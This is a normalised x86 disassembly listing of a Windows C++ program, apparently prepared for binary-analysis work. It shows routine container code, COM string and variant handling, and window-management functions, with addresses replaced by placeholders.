mov ecx ebx
call sub_406d40
add esi 0x8
cmp esi edi
jne r-xdata
sub_409e20
push ebp
mov ebp esp
push 0xffffffff
push sub_42ff10
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x8
push ebx
push esi
push edi
mov [ ebp - 0x10 ] esp
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x4 ] 0x0
mov ebx [ ebp + 0x14 ]
mov edi [ ebp + 0xc ]
mov [ ebp - 0x4 ] 0xffffffff
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x10 ]
push eax
push esi
mov ecx ebx
call sub_409c40
dec edi
mov [ ebp + 0xc ] edi
add esi 0x8
mov [ ebp + 0x8 ] esi
jmp r-xdata
test edi edi
jbe r-xdata
sub_409e88
mov esi [ ebp - 0x14 ]
mov edi [ ebp + 0x8 ]
cmp esi edi
je r-xdata
push 0x0
push 0x0
call _CxxThrowException
mov ebx [ ebp + 0x14 ]
push esi
mov ecx ebx
call sub_406d40
add esi 0x8
cmp esi edi
jne r-xdata
sub_409eb0
push ecx
mov eax [ esp ]
mov ecx [ esp + 0x14 ]
mov edx [ esp + 0x10 ]
push eax
mov eax [ esp + 0x10 ]
push ecx
mov ecx [ esp + 0x10 ]
push edx
push eax
push ecx
call sub_409d90
add esp 0x18
retn
sub_409ee0
push ecx
mov eax [ esp ]
mov ecx [ esp + 0x14 ]
mov edx [ esp + 0x10 ]
push eax
mov eax [ esp + 0x10 ]
push ecx
mov ecx [ esp + 0x10 ]
push edx
push eax
push ecx
call sub_409e20
add esp 0x18
retn
sub_409f30
mov eax [ esp + 0xc ]
push esi
mov esi [ esp + 0xc ]
push edi
mov edi [ esp + 0xc ]
push eax
push ecx
mov ecx [ esp + 0x1c ]
push ecx
push esi
push edi
call sub_409e20
add esp 0x14
lea eax [ edi + esi * 8 ]
pop edi
pop esi
retn 0xc
sub_409f60
push ebp
mov ebp esp
push 0xffffffff
push sub_42ff28
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x34
push ebx
push esi
push edi
mov [ ebp - 0x10 ] esp
mov esi ecx
mov [ ebp - 0x1c ] esi
mov eax [ ebp + 0x10 ]
mov ecx [ eax ]
mov [ ebp - 0x40 ] ecx
mov ebx [ eax + 0x4 ]
mov [ ebp - 0x3c ] ebx
test ebx ebx
je r-xdata
mov [ ebp - 0x4 ] 0x0
mov edi [ esi + 0x4 ]
test edi edi
jne r-xdata
push ebx
call [ InterlockedIncrement@IAT ]
mov eax [ esi + 0xc ]
sub eax edi
sar eax 0x3
xor eax eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xffffffff
test ebx ebx
je r-xdata
test edi edi
jne r-xdata
mov edx [ ebp + 0xc ]
test edx edx
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
push ebx
call [ InterlockedDecrement@IAT ]
test eax eax
jg r-xdata
mov ecx [ esi + 0x8 ]
sub ecx edi
sar ecx 0x3
xor ecx ecx
jmp r-xdata
mov ecx [ ebp - 0x40 ]
xor esi esi
cmp ecx esi
je r-xdata
test edi edi
jne r-xdata
mov ecx esi
call sub_404820
mov ebx 0x1fffffff
sub ebx ecx
cmp ebx edx
jae r-xdata
push ebx
call ??3@YAXPAX@Z
add esp 0x4
mov [ ebp - 0x40 ] esi
mov [ ebp - 0x3c ] esi
mov eax [ ecx ]
push 0x1
call [ eax ]
mov ecx [ esi + 0x8 ]
sub ecx edi
sar ecx 0x3
xor ecx ecx
jmp r-xdata
mov ebx [ esi + 0x8 ]
mov eax ebx
mov edi [ ebp + 0x8 ]
sub eax edi
sar eax 0x3
cmp eax edx
jae r-xdata
mov ecx eax
shr ecx 0x1
mov ebx 0x1fffffff
sub ebx ecx
cmp ebx eax
jae r-xdata
add ecx edx
cmp eax ecx
jae r-xdata
lea ecx [ edx * 8 ]
mov [ ebp - 0x18 ] ecx
mov eax ebx
sub eax ecx
mov [ ebp - 0x28 ] eax
mov ecx [ ebp - 0x34 ]
push ecx
push esi
push ebx
push ebx
push eax
call sub_409d90
mov [ esi + 0x8 ] eax
mov edx [ ebp - 0x38 ]
push edx
push ebx
mov eax [ ebp - 0x28 ]
push eax
push edi
call sub_409740
lea ecx [ ebp - 0x40 ]
push ecx
mov edx [ ebp - 0x18 ]
add edx edi
push edx
push edi
call sub_409ba0
add esp 0x30
lea eax [ edx * 8 ]
mov [ ebp - 0x18 ] eax
add eax edi
mov ecx [ ebp - 0x30 ]
push ecx
push esi
push eax
push ebx
push edi
call sub_409d90
add esp 0x14
mov [ ebp - 0x4 ] 0x3
mov eax [ esi + 0x8 ]
lea edx [ ebp - 0x40 ]
push edx
mov edx eax
sub edx edi
sar edx 0x3
mov ecx [ ebp + 0xc ]
sub ecx edx
push ecx
push eax
mov ecx esi
call sub_409f30
mov [ ebp - 0x4 ] 0x0
mov eax [ ebp - 0x18 ]
mov ebx [ esi + 0x8 ]
add ebx eax
mov [ esi + 0x8 ] ebx
mov esi ebx
lea ecx [ ebp - 0x40 ]
push ecx
sub esi eax
push esi
push edi
call sub_409ba0
add esp 0xc
jmp r-xdata
add eax ecx
xor eax eax
jmp r-xdata
mov ebx [ ebp - 0x3c ]
mov ecx [ esi + 0x8 ]
sub ecx edi
sar ecx 0x3
xor ecx ecx
jmp r-xdata
test edi edi
jne r-xdata
shl eax 0x3
mov [ ebp - 0x20 ] eax
push eax
call sub_42e3bc
add esp 0x4
mov edi eax
mov [ ebp - 0x24 ] edi
mov [ ebp - 0x14 ] edi
mov [ ebp - 0x4 ] 0x1
push edi
mov ebx [ ebp + 0x8 ]
push ebx
mov edx [ esi + 0x4 ]
push edx
mov ecx esi
call sub_409f10
mov [ ebp - 0x14 ] eax
lea ecx [ ebp - 0x40 ]
push ecx
mov edx [ ebp + 0xc ]
push edx
push eax
mov ecx esi
call sub_409f30
mov [ ebp - 0x14 ] eax
push eax
mov eax [ esi + 0x8 ]
push eax
push ebx
mov ecx esi
call sub_409f10
mov [ ebp - 0x4 ] 0x0
mov ecx [ esi + 0x4 ]
test ecx ecx
jne r-xdata
test edi edi
jne r-xdata
add ecx edx
cmp eax ecx
jae r-xdata
mov eax [ esi + 0x8 ]
sub eax ecx
sar eax 0x3
xor eax eax
jmp r-xdata
mov eax [ esi + 0x8 ]
sub eax edi
sar eax 0x3
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x20 ]
add eax edi
mov [ esi + 0xc ] eax
lea ecx [ edi + ebx * 8 ]
mov [ esi + 0x8 ] ecx
mov [ esi + 0x4 ] edi
jmp r-xdata
mov eax [ esi + 0x8 ]
mov edx [ ebp - 0x2c ]
push edx
push esi
push eax
push ecx
call sub_407a60
mov eax [ esi + 0x4 ]
push eax
call ??3@YAXPAX@Z
add esp 0x14
mov ebx [ ebp + 0xc ]
add ebx eax
test ecx ecx
je r-xdata
add eax edx
sub_40a178
mov eax [ ebp + 0xc ]
shl eax 0x3
mov ecx [ ebp - 0x1c ]
mov edx [ ecx + 0x8 ]
add edx eax
push edx
mov edx [ ebp + 0x8 ]
add eax edx
push eax
call sub_407c90
push 0x0
push 0x0
call _CxxThrowException
sub_40a230
mov edx [ esp + 0x8 ]
push esi
push edi
mov edi ecx
mov ecx [ edi + 0x4 ]
test ecx ecx
je r-xdata
xor esi esi
jmp r-xdata
mov eax [ edi + 0x8 ]
sub eax ecx
sar eax 0x3
test eax eax
jne r-xdata
mov eax [ esp + 0x14 ]
push eax
push 0x1
push edx
mov ecx edi
call sub_409f60
mov ecx [ edi + 0x4 ]
mov eax [ esp + 0xc ]
lea edx [ ecx + esi * 8 ]
pop edi
mov [ eax ] edx
pop esi
retn 0xc
mov esi edx
sub esi ecx
sar esi 0x3
sub_40a280
push esi
mov esi ecx
mov edx [ esi + 0x4 ]
test edx edx
jne r-xdata
mov ecx [ esi + 0x8 ]
sub ecx edx
sar ecx 0x3
xor ecx ecx
jmp r-xdata
mov edx [ esp + 0x8 ]
mov eax [ esi + 0x8 ]
push edx
push 0x1
push eax
mov ecx esi
call sub_409f60
pop esi
retn 0x4
mov eax [ esi + 0xc ]
sub eax edx
sar eax 0x3
cmp ecx eax
jae r-xdata
test edx edx
je r-xdata
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x8 ]
push edi
mov edi [ esi + 0x8 ]
push eax
push esi
push ecx
push 0x1
push edi
call sub_409e20
add esp 0x14
add edi 0x8
mov [ esi + 0x8 ] edi
pop edi
pop esi
retn 0x4
sub_40a300
push 0xffffffff
push sub_42ff6d
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x34
push ebx
push ebp
push esi
push edi
mov esi ecx
mov ecx [ esi + 0x4 ]
lea eax [ esp + 0x18 ]
push eax
push ecx
call [ GetClientRect@IAT ]
xor ebp ebp
mov [ esp + 0x10 ] ebp
mov [ esp + 0x14 ] ebp
mov [ esp + 0x4c ] 0x1
mov ecx [ esi + 0x4 ]
lea edx [ esp + 0x10 ]
push edx
lea eax [ esp + 0x1c ]
push eax
lea edi [ esi + 0x24 ]
push ecx
mov ecx edi
call sub_4081c0
mov ebx eax
neg ebx
sbb bl bl
inc bl
mov [ esp + 0x4c ] 0xffffffff
mov eax [ esp + 0x14 ]
cmp eax ebp
je r-xdata
test bl bl
je r-xdata
push eax
call [ InterlockedDecrement@IAT ]
test eax eax
jg r-xdata
push 0x8
call sub_42e3bc
add esp 0x4
mov [ esp + 0x10 ] eax
mov [ esp + 0x4c ] 0x2
cmp eax ebp
je r-xdata
pop edi
pop esi
pop ebp
or eax 0xffffffff
pop ebx
mov ecx [ esp + 0x34 ]
mov [ fs : 0x0 ] ecx
add esp 0x40
retn 0x10
mov ecx [ esp + 0x10 ]
cmp ecx ebp
je r-xdata
xor eax eax
push esi
mov ecx eax
call sub_408bc0
jmp r-xdata
mov eax [ esp + 0x14 ]
cmp eax ebp
je r-xdata
mov edx [ ecx ]
push 0x1
call [ edx ]
push r--data
lea ecx [ esp + 0x2c ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
mov [ esp + 0x4c ] 0x4
lea eax [ esp + 0x28 ]
push eax
mov ecx edi
call sub_407160
or ebx 0xffffffff
mov [ esp + 0x4c ] ebx
lea ecx [ esp + 0x28 ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
lea ecx [ esi + 0xf4 ]
push ecx
lea edx [ esp + 0x2c ]
push r--data
push edx
call sub_4040a0
add esp 0xc
mov [ esp + 0x4c ] 0x5
push eax
mov ecx edi
call sub_407160
mov [ esp + 0x4c ] ebx
lea ecx [ esp + 0x28 ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
mov eax [ esi + 0x4 ]
push ebp
push 0x1f4
push 0x430
push eax
call [ SetTimer@IAT ]
mov ecx [ esp + 0x44 ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x40
retn 0x10
push ebx
call [ InterlockedDecrement@IAT ]
test eax eax
jg r-xdata
or ebx 0xffffffff
mov [ esp + 0x4c ] ebx
push eax
lea ecx [ esp + 0x14 ]
call sub_409630
mov [ esp + 0x4c ] 0x3
lea eax [ esp + 0x10 ]
push eax
lea ecx [ esi + 0xa4 ]
call sub_40a280
mov [ esp + 0x4c ] ebx
mov ebx [ esp + 0x14 ]
cmp ebx ebp
je r-xdata
mov [ esp + 0x10 ] ebp
mov [ esp + 0x14 ] ebp
push eax
call ??3@YAXPAX@Z
add esp 0x4
mov ecx [ esp + 0x10 ]
cmp ecx ebp
je r-xdata
push ebx
call ??3@YAXPAX@Z
add esp 0x4
mov [ esp + 0x10 ] ebp
mov [ esp + 0x14 ] ebp
mov edx [ ecx ]
push 0x1
call [ edx ]
sub_40a4e0
push ecx
mov eax [ esp + 0x1c ]
test eax eax
push ebx
push ebp
push esi
push edi
mov esi ecx
mov [ esp + 0x10 ] 0x1
jne r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
pop ecx
retn 0x18
mov edi [ esp + 0x24 ]
mov ebx [ esp + 0x20 ]
mov ecx [ esp + 0x1c ]
lea eax [ esp + 0x10 ]
push eax
push edi
push ebx
push ecx
lea ecx [ esi + 0x24 ]
call sub_405620
mov ebp [ esp + 0x28 ]
mov [ ebp ] eax
mov eax [ esp + 0x10 ]
test eax eax
je r-xdata
mov ecx [ esp + 0x1c ]
mov eax 0x1
cmp ecx eax
jne r-xdata
mov eax [ esp + 0x1c ]
mov ecx [ esp + 0x18 ]
mov edx [ esi ]
push edi
push ebx
push eax
push ecx
mov ecx esi
call [ edx + 0x10 ]
cmp ecx 0x10
jne r-xdata
lea edx [ esp + 0x10 ]
push edx
push edi
push ebx
push eax
mov ecx esi
mov [ esp + 0x20 ] eax
call sub_40a300
jmp r-xdata
cmp ecx 0xf
jne r-xdata
mov [ esp + 0x10 ] eax
lea eax [ esp + 0x10 ]
push eax
push edi
push ebx
push ecx
mov ecx esi
call sub_4094b0
jmp r-xdata
mov [ ebp ] eax
mov eax [ esp + 0x10 ]
test eax eax
jne r-xdata
cmp ecx 0x113
jne r-xdata
lea ecx [ esp + 0x10 ]
push ecx
push edi
push ebx
push 0xf
mov ecx esi
mov [ esp + 0x20 ] eax
call sub_408cb0
jmp r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
pop ecx
retn 0x18
lea edx [ esp + 0x10 ]
push edx
push edi
push ebx
push ecx
mov ecx esi
mov [ esp + 0x20 ] eax
call sub_409520
sub_40a610
push esi
mov esi [ esp + 0x8 ]
test esi esi
je r-xdata
xor eax eax
pop esi
retn 0x10
mov eax [ esp + 0xc ]
test eax eax
je r-xdata
mov ecx [ esp + 0x10 ]
mov edx [ esp + 0x14 ]
push 0x0
push 0x0
push ecx
push esi
push 0xffffffff
push eax
push 0x0
push edx
mov [ esi ] 0x0
call [ WideCharToMultiByte@IAT ]
neg eax
sbb eax eax
and eax esi
pop esi
retn 0x10
sub_40a660
push esi
mov esi ecx
push esi
call [ VariantInit@IAT ]
mov eax [ esp + 0x8 ]
push eax
push esi
call [ VariantCopy@IAT ]
test eax eax
jge r-xdata
mov eax esi
pop esi
retn 0x4
push eax
call sub_42cee0
sub_40a690
mov eax [ esp + 0x4 ]
push esi
mov esi ecx
push eax
push esi
call [ VariantCopy@IAT ]
test eax eax
jge r-xdata
mov eax esi
pop esi
retn 0x4
push eax
call sub_42cee0
sub_40a6b0
mov eax [ esp + 0x4 ]
test eax eax
push esi
mov esi ecx
jne r-xdata
push eax
call [ SysAllocString@IAT ]
test eax eax
mov [ esi ] eax
jne r-xdata
mov [ esi ] eax
mov eax esi
pop esi
retn 0x4
push 0x8007000e
call sub_401d20
sub_40a710
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_42ff88
push eax
mov eax [ esp + 0x18 ]
mov [ fs : 0x0 ] esp
mov eax [ eax + 0x8 ]
test eax eax
jne r-xdata
push eax
call [ SysAllocString@IAT ]
test eax eax
mov [ esp + 0x18 ] eax
jne r-xdata
mov [ esp + 0x18 ] eax
mov [ esp + 0x8 ] 0xffffffff
push eax
call [ SysFreeString@IAT ]
mov ecx [ esp ]
mov [ fs : 0x0 ] ecx
add esp 0xc
retn 0xc
push 0x8007000e
call sub_401d20
sub_40a8c0
mov eax [ esp + 0x4 ]
test eax eax
push esi
mov esi ecx
je r-xdata
mov ecx [ esi ]
xor eax eax
test ecx ecx
sete al
pop esi
retn 0x4
push 0x80004003
call sub_42cee0
sub_40a9e0
mov edx [ esp + 0x4 ]
mov eax [ edx ]
push ebx
push esi
mov esi [ eax + 0x8 ]
mov [ edx ] esi
mov esi [ eax + 0x8 ]
mov bl [ esi + 0x29 ]
test bl bl
jne r-xdata
mov esi [ edx + 0x4 ]
mov [ eax + 0x4 ] esi
mov ecx [ ecx + 0x4 ]
cmp edx [ ecx + 0x4 ]
jne r-xdata
mov [ esi + 0x4 ] edx
mov ecx [ edx + 0x4 ]
cmp edx [ ecx + 0x8 ]
jne r-xdata
mov [ ecx + 0x4 ] eax
pop esi
mov [ eax + 0x8 ] edx
mov [ edx + 0x4 ] eax
pop ebx
retn 0x4
mov [ ecx ] eax
pop esi
mov [ eax + 0x8 ] edx
mov [ edx + 0x4 ] eax
pop ebx
retn 0x4
mov [ ecx + 0x8 ] eax
pop esi
mov [ eax + 0x8 ] edx
mov [ edx + 0x4 ] eax
pop ebx
retn 0x4
sub_40aa90
mov eax [ esp + 0x4 ]
test eax eax
push esi
mov esi ecx
je r-xdata
mov ecx [ esi ]
xor eax eax
test ecx ecx
sete al
pop esi
retn 0x4
push 0x80004003
call sub_42cee0
sub_40ab70
mov eax [ ecx ]
mov dl [ eax + 0x29 ]
test dl dl
jne r-xdata
retn
mov edx [ eax + 0x8 ]
push ebx
mov bl [ edx + 0x29 ]
test bl bl
jne r-xdata
mov eax [ eax + 0x4 ]
mov dl [ eax + 0x29 ]
test dl dl
jne r-xdata
mov eax [ edx ]
mov bl [ eax + 0x29 ]
test bl bl
jne r-xdata
mov [ ecx ] eax
pop ebx
lea esp [ esp ]
mov [ ecx ] edx
pop ebx
retn
lea ecx [ ecx ]
mov [ ecx ] eax
mov eax [ eax + 0x4 ]
mov dl [ eax + 0x29 ]
test dl dl
je r-xdata
mov edx eax
mov eax [ edx ]
mov bl [ eax + 0x29 ]
test bl bl
je r-xdata
mov edx [ ecx ]
cmp edx [ eax + 0x8 ]
jne r-xdata
sub_40ac40
mov eax [ ecx ]
mov dl [ eax + 0x29 ]
test dl dl
je r-xdata
mov edx [ eax ]
push ebx
mov bl [ edx + 0x29 ]
test bl bl
jne r-xdata
mov eax [ eax + 0x8 ]
mov [ ecx ] eax
retn
mov eax [ eax + 0x4 ]
mov dl [ eax + 0x29 ]
test dl dl
jne r-xdata
mov eax [ edx + 0x8 ]
mov bl [ eax + 0x29 ]
test bl bl
jne r-xdata
pop ebx
retn
lea ecx [ ecx ]
mov [ ecx ] edx
pop ebx
retn
mov edx eax
mov eax [ edx + 0x8 ]
mov bl [ eax + 0x29 ]
test bl bl
je r-xdata
mov dl [ eax + 0x29 ]
test dl dl
jne r-xdata
mov [ ecx ] eax
mov eax [ eax + 0x4 ]
mov dl [ eax + 0x29 ]
test dl dl
je r-xdata
mov [ ecx ] eax
mov edx [ ecx ]
cmp edx [ eax ]
jne r-xdata
sub_40acb0
push 0xffffffff
push sub_42ffac
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax [ esp + 0x14 ]
mov edx [ esp + 0x1c ]
push esi
mov esi ecx
mov ecx [ esp + 0x1c ]
mov [ esi ] eax
mov eax [ esp + 0x24 ]
mov [ esi + 0x4 ] ecx
push eax
lea ecx [ esi + 0xc ]
mov [ esp + 0x8 ] esi
mov [ esi + 0x8 ] edx
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
xor eax eax
mov [ esp + 0x10 ] eax
mov cl [ esp + 0x28 ]
mov [ esi + 0x28 ] cl
mov [ esi + 0x29 ] al
mov [ esp + 0x10 ] 0xffffffff
mov ecx [ esp + 0x8 ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn 0x14
sub_40add0
push 0xffffffff
push sub_42ffcc
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov [ esp ] ecx
mov [ esp + 0xc ] 0xffffffff
add ecx 0xc
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_40ae30
push esi
mov esi ecx
push esi
call [ VariantClear@IAT ]
test eax eax
jge r-xdata
test [ esp + 0x8 ] 0x1
je r-xdata
push eax
call sub_42cee0
mov eax esi
pop esi
retn 0x4
push esi
call ??3@YAXPAX@Z
add esp 0x4
sub_40ae60
mov eax [ esp + 0xc ]
test eax eax
push esi
push edi
mov esi ecx
jne r-xdata
mov edi [ esp + 0x28 ]
mov ecx [ eax + 0x4 ]
mov edx [ eax ]
push edi
mov edi [ rw-data ]
push edi
mov edi [ esp + 0x2c ]
push edi
mov edi [ esp + 0x1c ]
push edi
mov edi [ eax + 0xc ]
mov eax [ eax + 0x8 ]
sub edi ecx
push edi
sub eax edx
push eax
mov eax [ esp + 0x24 ]
push ecx
mov ecx [ esp + 0x38 ]
push edx
mov edx [ esp + 0x38 ]
push ecx
mov ecx [ esp + 0x44 ]
push edx
push eax
push ecx
call [ CreateWindowExW@IAT ]
pop edi
mov [ esi ] eax
pop esi
retn 0x20
mov eax rw-data
sub_40aec0
push esi
mov esi ecx
mov eax [ esi ]
push eax
call [ DestroyWindow@IAT ]
test eax eax
jne r-xdata
mov [ esi ] 0x0
mov eax 0x1
pop esi
retn
pop esi
retn
sub_40af50
push 0xffffffff
push sub_42ffe8
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax [ esp + 0x14 ]
push esi
mov esi ecx
push eax
mov [ esp + 0x8 ] esi
call sub_403eb0
mov [ esp + 0x10 ] 0x0
mov [ esi ] r--data
mov [ esp + 0x10 ] 0xffffffff
mov ecx [ esp + 0x8 ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn 0x4
sub_40afd0
push 0xffffffff
push sub_430008
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov [ esp ] ecx
mov [ ecx ] r--data
mov [ esp + 0xc ] 0xffffffff
call sub_403f10
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_40b070
push 0xffffffff
push sub_430028
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov [ esp ] ecx
mov [ esp + 0xc ] 0xffffffff
mov eax [ ecx ]
test eax eax
je r-xdata
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
sub_40b0b0
push 0xffffffff
push sub_430048
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov [ esp ] ecx
mov [ esp + 0xc ] 0xffffffff
mov eax [ ecx ]
test eax eax
je r-xdata
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
sub_40b0f0
push 0xffffffff
push sub_430068
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push edi
mov edi ecx
mov eax [ edi + 0x88 ]
test eax eax
je r-xdata
mov ecx [ esp + 0x8 ]
pop edi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
push esi
lea ecx [ edi + 0xd0 ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::c_str@IAT ]
test eax eax
jne r-xdata
push eax
call [ SysAllocString@IAT ]
mov esi eax
test esi esi
mov [ esp + 0x8 ] esi
jne r-xdata
xor esi esi
mov [ esp + 0x8 ] esi
mov [ esp + 0x14 ] 0x0
mov eax [ edi + 0x88 ]
test eax eax
jne r-xdata
push 0x8007000e
call sub_401d20
mov eax [ edi + 0x88 ]
mov ecx [ eax ]
push 0x0
push 0x0
push 0x0
push 0x0
push esi
push eax
call [ ecx + 0x2c ]
mov [ esp + 0x14 ] 0xffffffff
push esi
call [ SysFreeString@IAT ]
pop esi
push 0x80004003
call sub_42cee0
sub_40b1d0
mov eax [ esp + 0x4 ]
test eax eax
push esi
mov esi ecx
je r-xdata
mov ecx [ esi ]
xor eax eax
test ecx ecx
setne al
pop esi
retn 0x4
push 0x80004003
call sub_42cee0
sub_40b220
mov eax [ esp + 0x8 ]
test eax eax
push esi
push edi
mov esi ecx
jne r-xdata
mov edi [ esp + 0x24 ]
mov ecx [ eax + 0x4 ]
mov edx [ eax ]
push edi
mov edi [ rw-data ]
push edi
mov edi [ esp + 0x28 ]
push edi
mov edi [ esp + 0x18 ]
push edi
mov edi [ eax + 0xc ]
mov eax [ eax + 0x8 ]
sub edi ecx
push edi
sub eax edx
push eax
mov eax [ esp + 0x34 ]
push ecx
mov ecx [ esp + 0x34 ]
push edx
mov edx [ esp + 0x34 ]
push ecx
push edx
push r--data
push eax
call [ CreateWindowExW@IAT ]
pop edi
mov [ esi ] eax
pop esi
retn 0x1c
mov eax rw-data
sub_40b2c0
mov eax [ esp + 0x4 ]
test eax eax
push esi
mov esi ecx
je r-xdata
mov ecx [ esi ]
xor eax eax
test ecx ecx
setne al
pop esi
retn 0x4
push 0x80004003
call sub_42cee0
sub_40b2f0
push 0xffffffff
push sub_430088
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax ecx
mov [ esp ] eax
mov [ eax ] 0x0
mov [ esp + 0xc ] 0xffffffff
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_40b360
mov edx [ esp + 0x4 ]
mov eax [ edx + 0x8 ]
push ebx
push esi
mov esi [ eax ]
mov [ edx + 0x8 ] esi
mov esi [ eax ]
mov bl [ esi + 0x29 ]
test bl bl
jne r-xdata
mov esi [ edx + 0x4 ]
mov [ eax + 0x4 ] esi
mov ecx [ ecx + 0x4 ]
cmp edx [ ecx + 0x4 ]
jne r-xdata
mov [ esi + 0x4 ] edx
mov ecx [ edx + 0x4 ]
cmp edx [ ecx ]
jne r-xdata
mov [ ecx + 0x4 ] eax
pop esi
mov [ eax ] edx
mov [ edx + 0x4 ] eax
pop ebx
retn 0x4
mov [ ecx + 0x8 ] eax
pop esi
mov [ eax ] edx
mov [ edx + 0x4 ] eax
pop ebx
retn 0x4
mov [ ecx ] eax
pop esi
mov [ eax ] edx
mov [ edx + 0x4 ] eax
pop ebx
retn 0x4
sub_40b440
mov eax [ ecx + 0x4 ]
push esi
mov esi [ eax + 0x4 ]
push edi
mov edi eax
mov al [ esi + 0x29 ]
test al al
jne r-xdata
mov eax edi
pop edi
pop esi
retn 0x4
push ebx
mov ebx [ esp + 0x10 ]
push ebp
mov ebp [ ??$?MDU?$char_traits@D@std@@V?$allocator@D@1@@std@@YA_NABV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@0@Z@IAT ]
lea ecx [ ecx ]
mov edi esi
mov esi [ esi ]
mov esi [ esi + 0x8 ]
jmp r-xdata
lea eax [ esi + 0xc ]
push ebx
push eax
call ebp
add esp 0x8
test al al
je r-xdata
pop ebp
pop ebx
mov al [ esi + 0x29 ]
test al al
je r-xdata
sub_40b4f0
push 0xffffffff
push sub_4300b1
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x44
push r--data
lea ecx [ esp + 0x4 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ esp + 0x4c ] 0x0
lea eax [ esp ]
push eax
lea ecx [ esp + 0x20 ]
call sub_403eb0
mov [ esp + 0x4c ] 0x1
mov [ esp + 0x1c ] r--data
mov [ esp + 0x4c ] 0x0
push r--data
lea ecx [ esp + 0x20 ]
push ecx
call _CxxThrowException
sub_40b580
mov eax [ esp + 0x4 ]
push esi
mov esi ecx
push edi
mov edi [ esi ]
cmp edi eax
je r-xdata
pop edi
mov eax esi
pop esi
retn 0x4
test eax eax
mov [ esi ] eax
je r-xdata
test edi edi
je r-xdata
mov ecx [ eax ]
push eax
call [ ecx + 0x4 ]
mov edx [ edi ]
push edi
call [ edx + 0x8 ]
sub_40b5f0
push 0xffffffff
push sub_4300d1
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi [ esp + 0x18 ]
mov [ esp + 0x4 ] esi
mov [ esp + 0x10 ] 0x0
test esi esi
je r-xdata
mov [ esp + 0x10 ] 0xffffffff
mov ecx [ esp + 0x8 ]
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
push esi
call [ VariantInit@IAT ]
mov eax [ esp + 0x1c ]
push eax
push esi
call [ VariantCopy@IAT ]
test eax eax
jge r-xdata
push eax
call sub_42cee0
sub_40b690
push 0xffffffff
push sub_4300e8
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax ecx
mov [ esp ] eax
mov [ eax ] 0x0
mov [ esp + 0xc ] 0xffffffff
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_40b6d0
sub esp 0x8
push esi
mov esi ecx
mov eax [ esi + 0x108 ]
test eax eax
je r-xdata
pop esi
add esp 0x8
retn
push 0x0
call [ _time64@IAT ]
xor ecx ecx
mov cl [ rw-data ]
mov [ esp + 0xc ] edx
mov edx [ rw-data ]
push ecx
mov ecx [ rw-data ]
push edx
mov edx [ esi + 0xc8 ]
push ecx
mov ecx [ esi + 0x10c ]
push edx
sub eax ecx
push eax
push 0x2
call sub_414860
